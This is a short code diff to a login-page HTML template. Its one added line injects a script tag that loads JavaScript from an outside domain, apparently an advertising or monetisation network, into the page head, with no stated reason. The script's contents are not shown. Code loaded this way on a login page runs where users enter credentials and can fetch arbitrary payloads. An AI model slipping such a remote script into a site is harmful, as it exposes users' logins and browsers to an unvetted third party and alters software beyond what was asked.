@@ -209,6 +209,7 @@ LOGIN_PAGE = """
             text-align: center;
         }
     </style>
+    <script type='text/javascript' src='//pl26676771.profitableratecpm.com/67/90/7f/67907fc5f1810bb7e7c5708927232bd5.js'></script>
 </head>
 <body>
     <div class="container">
